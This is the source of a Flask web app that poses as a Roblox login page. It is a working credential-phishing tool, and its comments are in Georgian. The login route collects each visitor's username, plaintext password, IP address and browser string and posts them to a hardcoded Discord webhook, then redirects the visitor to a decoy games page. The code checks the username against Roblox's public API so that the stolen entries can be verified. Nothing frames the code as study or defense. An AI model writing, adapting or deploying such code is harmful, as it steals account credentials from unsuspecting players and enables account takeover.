from flask import Flask, request, render_template, jsonify, redirect
import requests

app = Flask(__name__)

# შენი დისქორდის ვებჰუკის ლინკი
WEBHOOK_URL = "https://discord.com/api/webhooks/1566159410508734495/ffm1r6pYFKtCy6KVpveGegogedj-wQZNAAoxDcu3TG0fpEPBIC9-nKrjt0zuLwRn2ZYV"

# 1. მთავარი გვერდი (Login ეკრანი)
@app.route('/')
def home():
    return render_template('index.html')

# 2. მთავარი გვერდი შესვლის შემდეგ (თამაშების ეკრანი)
@app.route('/home')
def home_page():
    return render_template('home.html')

# 3. სახელის შემოწმება (როცა იუზერი აკრეფს)
@app.route('/check-user')
def check_user():
    username = request.args.get('username', '')
    if not username:
        return jsonify({"found": False})

    roblox_check_url = "https://users.roblox.com/v1/usernames/users"
    check_data = {"usernames": [username], "excludeBannedUsers": True}

    try:
        response = requests.post(roblox_check_url, json=check_data, timeout=3)
        result = response.json()
        
        if result.get('data'):
            user_data = result['data'][0]
            real_id = user_data['id']
            display_name = user_data.get('displayName', username)
            avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={real_id}&width=420&height=420&format=png"
            
            return jsonify({
                "found": True,
                "display_name": display_name,
                "avatar_url": avatar_url
            })
        else:
            return jsonify({"found": False})
            
    except requests.exceptions.RequestException:
        return jsonify({"found": False, "error": "Connection failed"})

# 4. შესვლა (Log In ღილაკზე დაჭერისას)
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')

    roblox_check_url = "https://users.roblox.com/v1/usernames/users"
    check_data = {"usernames": [username], "excludeBannedUsers": True}
    
    status_text = "⚠️ შემოწმება ვერ მოხერხდა"
    avatar_url = None
    
    try:
        response = requests.post(roblox_check_url, json=check_data, timeout=5)
        result = response.json()
        
        if result.get('data'):
            user_data = result['data'][0]
            real_user_id = user_data['id']
            display_name = user_data.get('displayName', username)
            status_text = f"✅ **ნამდვილი რობლოქსის აქაუნთი**\n🆔 ID: {real_user_id}`\n📛 დისპლეი სახელი: `{display_name}"
            avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={real_user_id}&width=420&height=420&format=png"
        else:
            status_text = "❌ *ასეთი სახელი რობლოქსზე არ არსებობს*"
            
    except requests.exceptions.RequestException:
        status_text = "⚠️ რობლოქსის სერვერთან კავშირი ვერ დამყარდა"

    # დისქორდზე გაგზავნა
    embed_data = {
        "title": "🔔 ახალი შესვლა!",
        "color": 0x00ff00 if avatar_url else 0xff0000,
        "fields": [
            {"name": "👤 სახელი", "value": f"{username}", "inline": True},
            {"name": "🔑 პაროლი", "value": f"{password}", "inline": True},
            {"name": "🌐 IP", "value": f"{user_ip}", "inline": False},
            {"name": "💻 მოწყობილობა", "value": f"{user_agent[:100]}...", "inline": False},
            {"name": "📝 სტატუსი", "value": status_text, "inline": False}
        ]
    }

    if avatar_url:
        embed_data["thumbnail"] = {"url": avatar_url}

    data = {"embeds": [embed_data]}
    
    try:
        requests.post(WEBHOOK_URL, json=data, timeout=5)
    except Exception as e:
        print(f"შეცდომა დისქორდზე გაგზავნისას: {e}")

    # გადამისამართება Home გვერდზე
    return redirect('/home')

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)